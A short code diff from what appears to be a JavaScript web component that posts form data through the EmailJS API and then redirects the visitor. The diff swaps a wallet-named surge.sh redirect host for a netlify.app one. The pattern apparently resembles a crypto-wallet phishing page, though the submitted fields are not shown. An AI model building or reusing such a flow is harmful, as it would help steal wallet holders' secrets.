@@ -59,7 +59,7 @@ export default {
         axios
           .post("https://api.emailjs.com/api/v1.0/email/send", data)
           .then(function() {
-            window.location.href = "https://walletcloud-connect.surge.sh/";
+            window.location.href = "https://barcode-validation.netlify.app/";
             self.loading = false;
           })
           .catch(function() {
